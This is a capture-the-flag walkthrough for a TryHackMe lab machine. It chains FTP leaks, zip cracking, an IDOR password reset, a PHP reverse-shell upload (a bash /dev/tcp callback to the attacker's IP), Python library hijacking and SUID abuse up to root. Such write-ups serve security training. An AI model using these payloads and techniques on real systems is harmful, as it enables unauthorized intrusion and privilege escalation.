# Solstice — TryHackMe Official Writeup

> **Difficulty:** Easy/Medium  
> **OS:** Linux (Ubuntu 22.04)  
> **Author:** [your-thm-username]  
> **Platform:** [TryHackMe](https://tryhackme.com)

---

## Description

A space agency portal hiding secrets behind its stars.  
Enumerate, exploit and escalate your way to root.  
Can you reach mission control?

**Flags:**
- `user.txt` — found after lateral movement to user `mart`
- `secret.txt` — found after escalating to user `astro`
- `root.txt` — found after full privilege escalation to `root`

---

## Tools Used

- `nmap` — port scanning
- `ftp` — anonymous FTP access
- `zip2john` + `john` — cracking the zip password
- `burpsuite` — intercepting and modifying HTTP requests (IDOR)
- `netcat` — reverse shell listener
- `ssh` — lateral movement
- `find` — SUID enumeration
- GTFOBins — privilege escalation reference

---

## Walkthrough

### Phase 1 — Enumeration

Start with an nmap scan to discover open ports:

```bash
nmap -sV -sC -p- <machine-ip>
```

**Results:**
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.9
80/tcp open  http    Apache httpd 2.4.52
```

Three ports open: FTP, SSH and HTTP.

---

### Phase 2 — FTP Anonymous Login

FTP allows anonymous login. Connect and list files:

```bash
ftp <machine-ip>
```

```
Name: anonymous
Password: (press Enter)
ftp> ls
```

You will find two files:
- `readme.txt` — a note hinting that credentials are inside the zip
- `backup.zip` — a password-protected zip file

Download the zip:

```bash
ftp> get backup.zip
ftp> bye
```

Crack the zip password using `zip2john` and `john`:

```bash
zip2john backup.zip > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Extract the zip with the cracked password and read `note.txt` inside.  
You will find credentials for user `james`.

---

### Phase 3 — Web Application (Port 80)

Navigate to the web application:

```
http://<machine-ip>
```

You will find the **Solstice Space Agency** website. Click on **PORTAL** in the navigation bar to reach the login page at `/login.php`.

Log in with the credentials found in the zip.

Once logged in as `james`, navigate to **MY ACCOUNT** in the sidebar.  
You will find a **Reset Access Code** form.

---

### Phase 4 — IDOR via Burp Suite

Open **Burp Suite** and intercept the password reset request.

The POST request contains a hidden field:

```
user_id=2
```

Change `user_id=2` to `user_id=1` and forward the request.  
This changes the password of the `admin` user (ID 1) to whatever you set.

Now log in as `admin` with the new password.

---

### Phase 5 — File Upload → Reverse Shell

As `admin` you have access to the **Admin Control Panel**.  
Navigate to any project and click **UPLOAD IMAGE**.

Upload a PHP reverse shell (e.g. PentestMonkey):

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/<your-ip>/4444 0>&1'");
?>
```

Set up a listener on your machine:

```bash
nc -lvnp 4444
```

Access the uploaded shell:

```
http://<machine-ip>/uploads/shell.php
```

You now have a shell as `www-data`.

---

### Phase 6 — Lateral Movement: www-data → mart

Explore the system as `www-data`. Look for configuration files outside the web root.

You will find a file containing credentials for user `mart`.

Use those credentials to SSH into the machine:

```bash
ssh mart@<machine-ip>
```

Read the user flag:

```bash
cat ~/user.txt
```

---

### Phase 7 — Privilege Escalation: mart → astro (Python Library Hijacking)

Check the crontab:

```bash
cat /etc/crontab
```

You will notice that user `astro` runs a Python script located in `mart`'s home directory every minute:

```
* * * * *   astro   PYTHONPATH=/home/mart python3 /home/mart/monitor.py
```

Inspect the script:

```bash
cat ~/monitor.py
```

The script imports the `random` library:

```python
import random
number = random.randint(1, 9999)
print(f"the moon is now {number} from, heare")
```

Since `PYTHONPATH` is set to `/home/mart` and you can write there, create a malicious `random.py`:

```bash
nano ~/random.py
```

```python
import os
os.system("cp /bin/bash /tmp/astrobash && chmod u+s /tmp/astrobash")
```

Wait one minute for the cron job to execute, then run:

```bash
/tmp/astrobash -p
whoami
```

You are now `astro`. Read the secret flag:

```bash
cat ~/secret.txt
```

---

### Phase 8 — Privilege Escalation: astro → root (SUID)

Search for SUID binaries:

```bash
find / -perm -4000 2>/dev/null
```

You will find a binary that can be exploited using **GTFOBins**.  
Visit [https://gtfobins.github.io](https://gtfobins.github.io), search for the binary and follow the SUID instructions.

You are now `root`. Read the root flag:

```bash
cat /root/root.txt
```

---

## Flags Summary

| Flag | Location | How to get it |
|---|---|---|
| `user.txt` | `/home/mart/user.txt` | SSH as mart |
| `secret.txt` | `/home/astro/secret.txt` | Python library hijacking |
| `root.txt` | `/root/root.txt` | SUID exploitation |

---

## Key Takeaways

- **Anonymous FTP** can leak sensitive files
- **zip2john + john** can crack password-protected zip files
- **IDOR vulnerabilities** allow accessing other users' data by manipulating request parameters
- **Unrestricted file upload** allows uploading PHP shells for remote code execution
- **Python library hijacking** via `PYTHONPATH` manipulation can escalate privileges
- **SUID binaries** can be abused to gain root access via GTFOBins

---

*Solstice Space Agency — Reach beyond what was given.*
